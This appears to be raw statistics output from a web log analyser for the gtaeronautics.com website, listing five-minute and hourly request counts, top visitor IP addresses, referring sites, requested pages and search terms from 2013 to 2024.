5	Rr	0	0.000	2024	02	15	01	35
5	Rr	1	0.000	2024	02	15	01	30
5	Rr	0	0.000	2024	02	15	01	25
5	Rr	1	0.000	2024	02	15	01	20
5	Rr	0	0.000	2024	02	15	01	15
5	Rr	0	0.000	2024	02	15	01	10
5	Rr	2	0.000	2024	02	15	01	05
5	Rr	0	0.000	2024	02	15	01	00
5	Rr	0	0.000	2024	02	15	00	55
5	Rr	2	0.000	2024	02	15	00	50
5	Rr	2	0.000	2024	02	15	00	45
5	Rr	0	0.000	2024	02	15	00	40
5	Rr	0	0.000	2024	02	15	00	35
5	Rr	1	0.000	2024	02	15	00	30
5	Rr	5	0.000	2024	02	15	00	25
5	Rr	0	0.000	2024	02	15	00	20
5	Rr	0	0.000	2024	02	15	00	15
5	Rr	0	0.000	2024	02	15	00	10
5	Rr	0	0.000	2024	02	15	00	05
5	Rr	0	0.000	2024	02	15	00	00
5	Rr	0	0.000	2024	02	14	23	55
5	Rr	1	0.000	2024	02	14	23	50
5	Rr	0	0.000	2024	02	14	23	45
5	Rr	1	0.000	2024	02	14	23	40
5	Rr	0	0.000	2024	02	14	23	35
5	Rr	0	0.000	2024	02	14	23	30
5	Rr	0	0.000	2024	02	14	23	25
5	Rr	0	0.000	2024	02	14	23	20
5	Rr	0	0.000	2024	02	14	23	15
5	Rr	0	0.000	2024	02	14	23	10
5	Rr	0	0.000	2024	02	14	23	05
5	Rr	23	0.001	2024	02	14	23	00
5	Rr	3	0.000	2024	02	14	22	55
5	Rr	0	0.000	2024	02	14	22	50
5	Rr	6	0.000	2024	02	14	22	45
5	Rr	41	0.002	2024	02	14	22	40
5	Rr	32	0.002	2024	02	14	22	35
5	Rr	0	0.000	2024	02	14	22	30
5	Rr	1	0.000	2024	02	14	22	25
5	Rr	0	0.000	2024	02	14	22	20
5	Rr	0	0.000	2024	02	14	22	15
5	Rr	0	0.000	2024	02	14	22	10
5	Rr	0	0.000	2024	02	14	22	05
5	Rr	0	0.000	2024	02	14	22	00
5	Rr	0	0.000	2024	02	14	21	55
5	Rr	1	0.000	2024	02	14	21	50
5	Rr	0	0.000	2024	02	14	21	45
5	Rr	0	0.000	2024	02	14	21	40
5	Rr	0	0.000	2024	02	14	21	35
5	Rr	1	0.000	2024	02	14	21	30
5	Rr	1	0.000	2024	02	14	21	25
5	Rr	1	0.000	2024	02	14	21	20
5	Rr	0	0.000	2024	02	14	21	15
5	Rr	0	0.000	2024	02	14	21	10
5	Rr	1	0.000	2024	02	14	21	05
5	Rr	0	0.000	2024	02	14	21	00
5	Rr	3	0.000	2024	02	14	20	55
5	Rr	0	0.000	2024	02	14	20	50
5	Rr	0	0.000	2024	02	14	20	45
5	Rr	0	0.000	2024	02	14	20	40
5	Rr	0	0.000	2024	02	14	20	35
5	Rr	0	0.000	2024	02	14	20	30
5	Rr	0	0.000	2024	02	14	20	25
5	Rr	1	0.000	2024	02	14	20	20
5	Rr	1	0.000	2024	02	14	20	15
5	Rr	0	0.000	2024	02	14	20	10
5	Rr	1	0.000	2024	02	14	20	05
5	Rr	5	0.000	2024	02	14	20	00
5	Rr	1	0.000	2024	02	14	19	55
5	Rr	1	0.000	2024	02	14	19	50
5	Rr	2	0.000	2024	02	14	19	45
5	Rr	1	0.000	2024	02	14	19	40
5	Rr	0	0.000	2024	02	14	19	35
5	Rr	2	0.000	2024	02	14	19	30
5	Rr	1	0.000	2024	02	14	19	25
5	Rr	0	0.000	2024	02	14	19	20
5	Rr	1	0.000	2024	02	14	19	15
5	Rr	2	0.000	2024	02	14	19	10
5	Rr	0	0.000	2024	02	14	19	05
5	Rr	0	0.000	2024	02	14	19	00
5	Rr	0	0.000	2024	02	14	18	55
5	Rr	2	0.000	2024	02	14	18	50
5	Rr	0	0.000	2024	02	14	18	45
5	Rr	3	0.000	2024	02	14	18	40
5	Rr	0	0.000	2024	02	14	18	35
5	Rr	1	0.000	2024	02	14	18	30
5	Rr	0	0.000	2024	02	14	18	25
5	Rr	1	0.000	2024	02	14	18	20
5	Rr	0	0.000	2024	02	14	18	15
5	Rr	0	0.000	2024	02	14	18	10
5	Rr	0	0.000	2024	02	14	18	05
5	Rr	0	0.000	2024	02	14	18	00
5	Rr	0	0.000	2024	02	14	17	55
5	Rr	0	0.000	2024	02	14	17	50
5	Rr	1	0.000	2024	02	14	17	45
5	Rr	0	0.000	2024	02	14	17	40
5	Rr	0	0.000	2024	02	14	17	35
5	Rr	0	0.000	2024	02	14	17	30
5	Rr	0	0.000	2024	02	14	17	25
5	Rr	0	0.000	2024	02	14	17	20
5	Rr	0	0.000	2024	02	14	17	15
5	Rr	1	0.000	2024	02	14	17	10
5	Rr	0	0.000	2024	02	14	17	05
5	Rr	0	0.000	2024	02	14	17	00
5	Rr	0	0.000	2024	02	14	16	55
5	Rr	0	0.000	2024	02	14	16	50
5	Rr	0	0.000	2024	02	14	16	45
5	Rr	0	0.000	2024	02	14	16	40
5	Rr	0	0.000	2024	02	14	16	35
5	Rr	0	0.000	2024	02	14	16	30
5	Rr	0	0.000	2024	02	14	16	25
5	Rr	3	0.000	2024	02	14	16	20
5	Rr	0	0.000	2024	02	14	16	15
5	Rr	1	0.000	2024	02	14	16	10
5	Rr	0	0.000	2024	02	14	16	05
5	Rr	1	0.000	2024	02	14	16	00
5	Rr	0	0.000	2024	02	14	15	55
5	Rr	3	0.000	2024	02	14	15	50
5	Rr	1	0.000	2024	02	14	15	45
5	Rr	0	0.000	2024	02	14	15	40
5	Rr	0	0.000	2024	02	14	15	35
5	Rr	0	0.000	2024	02	14	15	30
5	Rr	0	0.000	2024	02	14	15	25
5	Rr	0	0.000	2024	02	14	15	20
5	Rr	0	0.000	2024	02	14	15	15
5	Rr	0	0.000	2024	02	14	15	10
5	Rr	0	0.000	2024	02	14	15	05
5	Rr	0	0.000	2024	02	14	15	00
5	Rr	0	0.000	2024	02	14	14	55
5	Rr	1	0.000	2024	02	14	14	50
5	Rr	0	0.000	2024	02	14	14	45
5	Rr	0	0.000	2024	02	14	14	40
5	Rr	0	0.000	2024	02	14	14	35
5	Rr	0	0.000	2024	02	14	14	30
5	Rr	0	0.000	2024	02	14	14	25
5	Rr	0	0.000	2024	02	14	14	20
5	Rr	0	0.000	2024	02	14	14	15
5	Rr	0	0.000	2024	02	14	14	10
5	Rr	2	0.000	2024	02	14	14	05
5	Rr	0	0.000	2024	02	14	14	00
5	Rr	0	0.000	2024	02	14	13	55
5	Rr	0	0.000	2024	02	14	13	50
5	Rr	0	0.000	2024	02	14	13	45
5	Rr	0	0.000	2024	02	14	13	40
5	Rr	0	0.000	2024	02	14	13	35
5	Rr	0	0.000	2024	02	14	13	30
5	Rr	0	0.000	2024	02	14	13	25
5	Rr	1	0.000	2024	02	14	13	20
5	Rr	1	0.000	2024	02	14	13	15
5	Rr	0	0.000	2024	02	14	13	10
5	Rr	0	0.000	2024	02	14	13	05
5	Rr	0	0.000	2024	02	14	13	00
5	Rr	0	0.000	2024	02	14	12	55
5	Rr	0	0.000	2024	02	14	12	50
5	Rr	0	0.000	2024	02	14	12	45
5	Rr	0	0.000	2024	02	14	12	40
5	Rr	1	0.000	2024	02	14	12	35
5	Rr	0	0.000	2024	02	14	12	30
5	Rr	3	0.000	2024	02	14	12	25
5	Rr	0	0.000	2024	02	14	12	20
5	Rr	1	0.000	2024	02	14	12	15
5	Rr	0	0.000	2024	02	14	12	10
5	Rr	1	0.000	2024	02	14	12	05
5	Rr	1	0.000	2024	02	14	12	00
5	Rr	0	0.000	2024	02	14	11	55
5	Rr	0	0.000	2024	02	14	11	50
5	Rr	0	0.000	2024	02	14	11	45
5	Rr	1	0.000	2024	02	14	11	40
5	Rr	0	0.000	2024	02	14	11	35
5	Rr	1	0.000	2024	02	14	11	30
5	Rr	0	0.000	2024	02	14	11	25
5	Rr	0	0.000	2024	02	14	11	20
5	Rr	1	0.000	2024	02	14	11	15
5	Rr	3	0.000	2024	02	14	11	10
5	Rr	2	0.000	2024	02	14	11	05
5	Rr	0	0.000	2024	02	14	11	00
5	Rr	0	0.000	2024	02	14	10	55
5	Rr	0	0.000	2024	02	14	10	50
5	Rr	0	0.000	2024	02	14	10	45
5	Rr	0	0.000	2024	02	14	10	40
5	Rr	0	0.000	2024	02	14	10	35
5	Rr	0	0.000	2024	02	14	10	30
5	Rr	0	0.000	2024	02	14	10	25
5	Rr	0	0.000	2024	02	14	10	20
5	Rr	0	0.000	2024	02	14	10	15
5	Rr	86	0.005	2024	02	14	10	10
5	Rr	0	0.000	2024	02	14	10	05
5	Rr	0	0.000	2024	02	14	10	00
5	Rr	0	0.000	2024	02	14	09	55
5	Rr	0	0.000	2024	02	14	09	50
5	Rr	0	0.000	2024	02	14	09	45
5	Rr	1	0.000	2024	02	14	09	40
5	Rr	0	0.000	2024	02	14	09	35
5	Rr	0	0.000	2024	02	14	09	30
5	Rr	0	0.000	2024	02	14	09	25
5	Rr	0	0.000	2024	02	14	09	20
5	Rr	0	0.000	2024	02	14	09	15
5	Rr	0	0.000	2024	02	14	09	10
5	Rr	0	0.000	2024	02	14	09	05
5	Rr	0	0.000	2024	02	14	09	00
5	Rr	0	0.000	2024	02	14	08	55
5	Rr	0	0.000	2024	02	14	08	50
5	Rr	0	0.000	2024	02	14	08	45
5	Rr	0	0.000	2024	02	14	08	40
5	Rr	0	0.000	2024	02	14	08	35
5	Rr	0	0.000	2024	02	14	08	30
5	Rr	0	0.000	2024	02	14	08	25
5	Rr	0	0.000	2024	02	14	08	20
5	Rr	0	0.000	2024	02	14	08	15
5	Rr	0	0.000	2024	02	14	08	10
5	Rr	1	0.000	2024	02	14	08	05
5	Rr	1	0.000	2024	02	14	08	00
5	Rr	0	0.000	2024	02	14	07	55
5	Rr	0	0.000	2024	02	14	07	50
5	Rr	0	0.000	2024	02	14	07	45
5	Rr	1	0.000	2024	02	14	07	40
5	Rr	1	0.000	2024	02	14	07	35
5	Rr	0	0.000	2024	02	14	07	30
5	Rr	0	0.000	2024	02	14	07	25
5	Rr	0	0.000	2024	02	14	07	20
5	Rr	0	0.000	2024	02	14	07	15
5	Rr	0	0.000	2024	02	14	07	10
5	Rr	2	0.000	2024	02	14	07	05
5	Rr	0	0.000	2024	02	14	07	00
5	Rr	0	0.000	2024	02	14	06	55
5	Rr	1	0.000	2024	02	14	06	50
5	Rr	0	0.000	2024	02	14	06	45
5	Rr	1	0.000	2024	02	14	06	40
5	Rr	8	0.000	2024	02	14	06	35
5	Rr	110	0.006	2024	02	14	06	30
5	Rr	0	0.000	2024	02	14	06	25
5	Rr	1	0.000	2024	02	14	06	20
5	Rr	0	0.000	2024	02	14	06	15
5	Rr	3	0.000	2024	02	14	06	10
5	Rr	2	0.000	2024	02	14	06	05
5	Rr	0	0.000	2024	02	14	06	00
5	*BT	R	945	2023	05	08	18	00
7	Rr	5953	0.349	00	00
7	Rr	4956	0.290	00	05
7	Rr	5885	0.345	00	10
7	Rr	4162	0.244	00	15
7	Rr	5369	0.315	00	20
7	Rr	6222	0.365	00	25
7	Rr	5344	0.313	00	30
7	Rr	6242	0.366	00	35
7	Rr	5449	0.319	00	40
7	Rr	5388	0.316	00	45
7	Rr	5866	0.344	00	50
7	Rr	5592	0.328	00	55
7	Rr	5508	0.323	01	00
7	Rr	4963	0.291	01	05
7	Rr	4675	0.274	01	10
7	Rr	5242	0.307	01	15
7	Rr	5781	0.339	01	20
7	Rr	5333	0.313	01	25
7	Rr	4966	0.291	01	30
7	Rr	5211	0.305	01	35
7	Rr	5505	0.323	01	40
7	Rr	5290	0.310	01	45
7	Rr	6230	0.365	01	50
7	Rr	5455	0.320	01	55
7	Rr	5025	0.294	02	00
7	Rr	4672	0.274	02	05
7	Rr	4841	0.284	02	10
7	Rr	6178	0.362	02	15
7	Rr	5515	0.323	02	20
7	Rr	5814	0.341	02	25
7	Rr	5842	0.342	02	30
7	Rr	5510	0.323	02	35
7	Rr	5525	0.324	02	40
7	Rr	4714	0.276	02	45
7	Rr	5673	0.332	02	50
7	Rr	5898	0.346	02	55
7	Rr	5792	0.339	03	00
7	Rr	4931	0.289	03	05
7	Rr	5107	0.299	03	10
7	Rr	5000	0.293	03	15
7	Rr	5341	0.313	03	20
7	Rr	5324	0.312	03	25
7	Rr	5394	0.316	03	30
7	Rr	5384	0.316	03	35
7	Rr	5220	0.306	03	40
7	Rr	6059	0.355	03	45
7	Rr	6836	0.401	03	50
7	Rr	5692	0.334	03	55
7	Rr	5310	0.311	04	00
7	Rr	5289	0.310	04	05
7	Rr	5198	0.305	04	10
7	Rr	5423	0.318	04	15
7	Rr	4618	0.271	04	20
7	Rr	5154	0.302	04	25
7	Rr	5160	0.302	04	30
7	Rr	5141	0.301	04	35
7	Rr	6152	0.361	04	40
7	Rr	5618	0.329	04	45
7	Rr	5892	0.345	04	50
7	Rr	6075	0.356	04	55
7	Rr	5317	0.312	05	00
7	Rr	5215	0.306	05	05
7	Rr	4870	0.285	05	10
7	Rr	6076	0.356	05	15
7	Rr	5383	0.315	05	20
7	Rr	5058	0.296	05	25
7	Rr	5007	0.293	05	30
7	Rr	5004	0.293	05	35
7	Rr	4869	0.285	05	40
7	Rr	5350	0.314	05	45
7	Rr	5008	0.293	05	50
7	Rr	5294	0.310	05	55
7	Rr	4730	0.277	06	00
7	Rr	5945	0.348	06	05
7	Rr	5412	0.317	06	10
7	Rr	5436	0.319	06	15
7	Rr	4188	0.245	06	20
7	Rr	4809	0.282	06	25
7	Rr	5334	0.313	06	30
7	Rr	4989	0.292	06	35
7	Rr	4690	0.275	06	40
7	Rr	4704	0.276	06	45
7	Rr	4669	0.274	06	50
7	Rr	4164	0.244	06	55
7	Rr	6022	0.353	07	00
7	Rr	4457	0.261	07	05
7	Rr	4756	0.279	07	10
7	Rr	4573	0.268	07	15
7	Rr	5449	0.319	07	20
7	Rr	5078	0.298	07	25
7	Rr	4938	0.289	07	30
7	Rr	4913	0.288	07	35
7	Rr	4549	0.267	07	40
7	Rr	5467	0.320	07	45
7	Rr	4234	0.248	07	50
7	Rr	4447	0.261	07	55
7	Rr	4773	0.280	08	00
7	Rr	4405	0.258	08	05
7	Rr	4637	0.272	08	10
7	Rr	4438	0.260	08	15
7	Rr	4706	0.276	08	20
7	Rr	4916	0.288	08	25
7	Rr	4796	0.281	08	30
7	Rr	4953	0.290	08	35
7	Rr	5087	0.298	08	40
7	Rr	4786	0.280	08	45
7	Rr	4249	0.249	08	50
7	Rr	3917	0.230	08	55
7	Rr	4284	0.251	09	00
7	Rr	4123	0.242	09	05
7	Rr	3942	0.231	09	10
7	Rr	3445	0.202	09	15
7	Rr	4243	0.249	09	20
7	Rr	5044	0.296	09	25
7	Rr	4381	0.257	09	30
7	Rr	4900	0.287	09	35
7	Rr	5402	0.317	09	40
7	Rr	4051	0.237	09	45
7	Rr	3929	0.230	09	50
7	Rr	4214	0.247	09	55
7	Rr	4412	0.259	10	00
7	Rr	4006	0.235	10	05
7	Rr	4489	0.263	10	10
7	Rr	4010	0.235	10	15
7	Rr	4857	0.285	10	20
7	Rr	5147	0.302	10	25
7	Rr	4813	0.282	10	30
7	Rr	5325	0.312	10	35
7	Rr	5151	0.302	10	40
7	Rr	4086	0.239	10	45
7	Rr	5674	0.333	10	50
7	Rr	4748	0.278	10	55
7	Rr	6294	0.369	11	00
7	Rr	5136	0.301	11	05
7	Rr	5110	0.299	11	10
7	Rr	4640	0.272	11	15
7	Rr	4179	0.245	11	20
7	Rr	5998	0.351	11	25
7	Rr	6446	0.378	11	30
7	Rr	4297	0.252	11	35
7	Rr	4518	0.265	11	40
7	Rr	4804	0.282	11	45
7	Rr	4350	0.255	11	50
7	Rr	4091	0.240	11	55
7	Rr	5055	0.296	12	00
7	Rr	5300	0.311	12	05
7	Rr	5275	0.309	12	10
7	Rr	4380	0.257	12	15
7	Rr	4714	0.276	12	20
7	Rr	4854	0.284	12	25
7	Rr	4362	0.256	12	30
7	Rr	4835	0.283	12	35
7	Rr	4701	0.275	12	40
7	Rr	4821	0.283	12	45
7	Rr	5343	0.313	12	50
7	Rr	5398	0.316	12	55
7	Rr	5030	0.295	13	00
7	Rr	4502	0.264	13	05
7	Rr	5256	0.308	13	10
7	Rr	5925	0.347	13	15
7	Rr	6081	0.356	13	20
7	Rr	5566	0.326	13	25
7	Rr	4995	0.293	13	30
7	Rr	5686	0.333	13	35
7	Rr	6151	0.360	13	40
7	Rr	4168	0.244	13	45
7	Rr	5923	0.347	13	50
7	Rr	5498	0.322	13	55
7	Rr	6052	0.355	14	00
7	Rr	6480	0.380	14	05
7	Rr	6211	0.364	14	10
7	Rr	7707	0.452	14	15
7	Rr	7240	0.424	14	20
7	Rr	6757	0.396	14	25
7	Rr	6959	0.408	14	30
7	Rr	6326	0.371	14	35
7	Rr	7041	0.413	14	40
7	Rr	6258	0.367	14	45
7	Rr	5518	0.323	14	50
7	Rr	7245	0.425	14	55
7	Rr	7295	0.427	15	00
7	Rr	5886	0.345	15	05
7	Rr	6709	0.393	15	10
7	Rr	5780	0.339	15	15
7	Rr	7349	0.431	15	20
7	Rr	6816	0.399	15	25
7	Rr	7108	0.417	15	30
7	Rr	7180	0.421	15	35
7	Rr	8488	0.497	15	40
7	Rr	6269	0.367	15	45
7	Rr	7819	0.458	15	50
7	Rr	7861	0.461	15	55
7	Rr	7267	0.426	16	00
7	Rr	7823	0.458	16	05
7	Rr	8062	0.472	16	10
7	Rr	8736	0.512	16	15
7	Rr	8042	0.471	16	20
7	Rr	7267	0.426	16	25
7	Rr	7161	0.420	16	30
7	Rr	8027	0.470	16	35
7	Rr	7481	0.438	16	40
7	Rr	7994	0.468	16	45
7	Rr	8490	0.498	16	50
7	Rr	6867	0.402	16	55
7	Rr	8161	0.478	17	00
7	Rr	8406	0.493	17	05
7	Rr	8210	0.481	17	10
7	Rr	7340	0.430	17	15
7	Rr	8420	0.493	17	20
7	Rr	8031	0.471	17	25
7	Rr	8668	0.508	17	30
7	Rr	7356	0.431	17	35
7	Rr	7737	0.453	17	40
7	Rr	7597	0.445	17	45
7	Rr	7476	0.438	17	50
7	Rr	7486	0.439	17	55
7	Rr	9363	0.549	18	00
7	Rr	7897	0.463	18	05
7	Rr	7669	0.449	18	10
7	Rr	7993	0.468	18	15
7	Rr	6718	0.394	18	20
7	Rr	7640	0.448	18	25
7	Rr	7465	0.437	18	30
7	Rr	6794	0.398	18	35
7	Rr	8944	0.524	18	40
7	Rr	7121	0.417	18	45
7	Rr	8983	0.526	18	50
7	Rr	7610	0.446	18	55
7	Rr	7880	0.462	19	00
7	Rr	7324	0.429	19	05
7	Rr	7734	0.453	19	10
7	Rr	7008	0.411	19	15
7	Rr	6671	0.391	19	20
7	Rr	7146	0.419	19	25
7	Rr	6909	0.405	19	30
7	Rr	8667	0.508	19	35
7	Rr	7025	0.412	19	40
7	Rr	8251	0.484	19	45
7	Rr	7889	0.462	19	50
7	Rr	8509	0.499	19	55
7	Rr	7788	0.456	20	00
7	Rr	7217	0.423	20	05
7	Rr	6782	0.397	20	10
7	Rr	6928	0.406	20	15
7	Rr	8409	0.493	20	20
7	Rr	7472	0.438	20	25
7	Rr	6948	0.407	20	30
7	Rr	7493	0.439	20	35
7	Rr	6646	0.389	20	40
7	Rr	7955	0.466	20	45
7	Rr	7770	0.455	20	50
7	Rr	6854	0.402	20	55
7	Rr	7533	0.441	21	00
7	Rr	7040	0.413	21	05
7	Rr	6551	0.384	21	10
7	Rr	7068	0.414	21	15
7	Rr	6735	0.395	21	20
7	Rr	7321	0.429	21	25
7	Rr	5765	0.338	21	30
7	Rr	7423	0.435	21	35
7	Rr	6111	0.358	21	40
7	Rr	8284	0.485	21	45
7	Rr	7287	0.427	21	50
7	Rr	5456	0.320	21	55
7	Rr	5809	0.340	22	00
7	Rr	5783	0.339	22	05
7	Rr	6043	0.354	22	10
7	Rr	6255	0.367	22	15
7	Rr	6344	0.372	22	20
7	Rr	5598	0.328	22	25
7	Rr	6123	0.359	22	30
7	Rr	6505	0.381	22	35
7	Rr	5614	0.329	22	40
7	Rr	6804	0.399	22	45
7	Rr	5744	0.337	22	50
7	Rr	5380	0.315	22	55
7	Rr	6160	0.361	23	00
7	Rr	6279	0.368	23	05
7	Rr	6725	0.394	23	10
7	Rr	6765	0.396	23	15
7	Rr	6719	0.394	23	20
7	Rr	5934	0.348	23	25
7	Rr	4845	0.284	23	30
7	Rr	5210	0.305	23	35
7	Rr	5322	0.312	23	40
7	Rr	4845	0.284	23	45
7	Rr	5903	0.346	23	50
7	Rr	5897	0.346	23	55
o	*f	0R	r
o	lRQ	1	1706440	3838599433	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	81907	3.582	98
Z	lRb	1	76310	2.566	66.249
Z	lRb	1	55369	2.524	51
Z	lRb	1	50981	1.794	34
Z	lRb	1	47496	2.025	35
Z	lRb	1	43935	1.401	69
Z	lRb	1	32440	0.506	49
Z	lRb	1	32196	2.897	54
Z	lRb	1	28259	0.945	123
Z	lRb	1	26407	2.331	40
Z	lRb	1	26213	0.641	46
Z	lRb	1	25287	2.469	157.55
Z	lRb	1	23759	2.596	70
Z	lRb	1	23164	1.160	76
Z	lRb	1	22777	1.170	104
Z	lRb	1	20827	1.924	207.46
Z	lRb	1	19053	1.032	52
Z	lRb	1	17225	1.539	72
Z	lRb	1	16327	0.895	75
Z	lRb	1	15509	0.894	107
Z	lRb	1	1020999	65.108	[not listed: 9178]
S	*f	-50P	r
S	Rb	4702	0.294	14.33.246.211
S	Rb	3866	0.592	192.234.235.103
S	Rb	3650	0.027	162.55.85.223
S	Rb	3517	0.000	66.249.66.166
S	Rb	3248	0.184	192.99.15.146
S	Rb	3019	0.222	216.244.66.229
S	Rb	2542	0.020	49.7.20.111
S	Rb	2489	0.009	49.7.20.105
S	Rb	2341	0.102	100.43.83.148
S	Rb	2232	0.000	66.249.66.164
S	Rb	2164	0.107	68.66.226.98
S	Rb	2091	0.000	66.249.66.165
S	Rb	1992	0.051	66.249.75.109
S	Rb	1829	0.111	37.59.14.116
S	Rb	1781	0.161	75.98.173.33
S	Rb	1750	0.000	66.249.66.167
S	Rb	1736	0.215	79.125.27.96
S	Rb	1597	0.097	78.155.138.20
S	Rb	1566	0.000	62.194.247.203
S	Rb	1543	0.055	199.21.99.79
S	Rb	1497	0.003	66.249.66.195
S	Rb	1461	0.000	49.7.20.135
S	Rb	1459	0.008	92.249.127.111
S	Rb	1352	0.045	49.7.20.102
S	Rb	1340	0.001	66.249.66.168
S	Rb	1330	0.014	109.102.111.58
S	Rb	1312	0.033	205.203.134.197
S	Rb	1304	0.144	5.196.13.127
S	Rb	1285	0.033	144.76.27.118
S	Rb	1276	0.089	208.115.113.82
S	Rb	1270	0.048	95.108.248.29
S	Rb	1155	0.173	75.98.173.84
S	Rb	1142	0.001	91.207.9.226
S	Rb	1107	0.012	66.249.69.97
S	Rb	1099	0.014	52.35.20.1
S	Rb	1081	0.014	66.249.69.81
S	Rb	1074	0.000	49.7.21.96
S	Rb	1048	0.064	157.90.182.26
S	Rb	1047	0.013	106.38.241.144
S	Rb	1039	0.011	66.249.69.89
S	Rb	1030	0.073	5.255.250.90
S	Rb	1024	0.055	95.108.150.235
S	Rb	1012	0.061	192.99.6.132
S	Rb	912	0.000	49.7.21.93
S	Rb	815	0.022	178.63.23.80
S	Rb	811	0.000	123.183.224.65
S	Rb	808	0.136	149.202.211.239
S	Rb	795	0.052	49.7.20.108
S	Rb	791	0.048	192.99.7.55
S	Rb	786	0.087	66.11.128.152
S	Rb	1623323	96.496	[not listed: 109673]
s	*FR	2013	12	18	21	53
s	*LR	2024	02	15	03	56
s	*f	-20R	s
s	lRS	1	494030	1194	http://www.gtaeronautics.com/
s	lRS	1	117766	388	http://gtaeronautics.com/
s	lRS	1	8723	20	https://www.google.com/
s	lRS	1	1713	3	http://www.google.com/
s	lRS	1	537	3	https://www.bing.com/
s	lRS	1	1287	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	420	0	http://122.144.179.12/
s	lRS	1	399	0	https://www.thomasnet.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	394	0	http://baidu.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	328	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	281	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	50547	4	[not listed: 4434]
f	*FR	2013	12	18	21	53
f	*LR	2024	02	15	03	56
f	*f	-30R	s
f	lRS	1	367853	1042	http://www.gtaeronautics.com/
f	lRS	1	76236	222	http://gtaeronautics.com/
f	lRS	1	3999	55	http://gtaeronautics.com/contactus.html
f	lRS	1	7954	46	http://gtaeronautics.com/links.html
f	lRS	1	17891	26	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	8073	20	https://www.google.com/
f	lRS	1	10450	15	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	4224	15	http://www.gtaeronautics.com/SRU.html
f	lRS	1	3323	14	http://www.gtaeronautics.com/RD.html
f	lRS	1	6712	13	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	5848	12	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	3314	10	http://gtaeronautics.com/aboutus.html
f	lRS	1	2962	10	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	8711	9	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	4085	6	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	13158	3	http://www.gtaeronautics.com/index.html
f	lRS	1	4255	3	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	4161	3	http://www.gtaeronautics.com/pna.html
f	lRS	1	3177	3	http://gtaeronautics.com/index.html
f	lRS	1	2939	3	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	2739	3	http://gtaeronautics.com/CCT&M.html
f	lRS	1	2429	3	http://www.gtaeronautics.com/GT100HL RPAS.html
f	lRS	1	2106	3	http://gtaeronautics.com/ConsultingA.html
f	lRS	1	3775	2	http://www.gtaeronautics.com/contactus.html
f	lRS	1	4486	1	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	5892	0	http://gtaeronautics.com/IndNews.html
f	lRS	1	4962	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	2983	0	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	2558	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	2085	0	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	87756	70	[not listed: 5142]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	36.935	kit
n	Rq	1	36.935	method
n	Rq	2	73.871	crew
n	Rq	28	262.775	aeronautical
n	Rq	1	36.935	airplane.com
n	Rq	5	184.677	faa
n	Rq	40	209.486	gt
n	Rq	1	36.935	moldings
n	Rq	1	36.935	twin
n	Rq	1	36.935	taranis
n	Rq	2	36.935	installerex
n	Rq	2	36.935	http://gtaeronautics.com/
n	Rq	20	94.452	in
n	Rq	1	36.935	scale
n	Rq	1	36.935	observer
n	Rq	1	36.935	drawing?
n	Rq	2	36.935	is
n	Rq	1	36.935	making
n	Rq	2	73.871	fiber
n	Rq	1	36.935	mitsubishi
n	Rq	1	36.935	fuze
n	Rq	1	36.935	http://www.gtaeronautics.com/indnews.html
n	Rq	92	36.935	semalt.com
n	Rq	1	36.935	consultant
n	Rq	15	147.742	manufacturing
n	Rq	1	36.935	2
n	Rq	1	36.935	base
n	Rq	14	242.194	6
n	Rq	1	36.935	http://gtaeronautics.com/indnews.html
n	Rq	1	36.935	always
n	Rq	28	98.679	engineering
n	Rq	1	36.935	northrop
n	Rq	1	36.935	bandwidth
n	Rq	1	36.935	vegas
n	Rq	3	73.871	basic
n	Rq	1	36.935	qinetiq
n	Rq	1	36.935	tooling
n	Rq	1	36.935	on
n	Rq	1	36.935	heavy
n	Rq	9	20.581	drawings
n	Rq	1	36.935	fia
n	Rq	4	36.935	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	36.935	llc
n	Rq	3	110.806	rullman
n	Rq	1	36.935	cowling
n	Rq	32	110.806	sale
n	Rq	64	221.613	outlet
n	Rq	1	36.935	rotax
n	Rq	1	36.935	ucav
n	Rq	28	61.744	texan
n	Rq	1	36.935	a
n	Rq	2	36.935	customer
n	Rq	1	36.935	rpa
n	Rq	2	73.871	110cc
n	Rq	30	36.935	designer
n	Rq	20	184.677	www.gtaeronautics.com
n	Rq	1	36.935	work
n	Rq	1	36.935	thomas
n	Rq	1	36.935	engie
n	Rq	1	36.935	qualification
n	Rq	1	36.935	custom
n	Rq	1	36.935	mk3
n	Rq	1	36.935	t
n	Rq	1	36.935	uavs
n	Rq	1	36.935	w
n	Rq	2	36.935	satisfaction
n	Rq	2	73.871	x
n	Rq	1	36.935	crews
n	Rq	3	36.935	photos
n	Rq	1	36.935	finnemeccia
n	Rq	2	73.871	glass
n	Rq	1	110.806	to
n	Rq	1	36.935	gcs
n	Rq	5	184.677	engineer
n	Rq	1	36.935	government
n	Rq	1	36.935	operator
n	Rq	6	221.613	aircraft
n	Rq	1	36.935	with
n	Rq	97	73.871	number
n	Rq	4	110.806	for
n	Rq	1	36.935	december
n	Rq	2	73.871	aero
n	Rq	9	73.871	equipment
n	Rq	2	73.871	engine
n	Rq	1	36.935	mq1
n	Rq	2	73.871	wy
n	Rq	1	36.935	custum
n	Rq	1	36.935	g.t
n	Rq	1	36.935	mechanics
n	Rq	1	73.871	motors
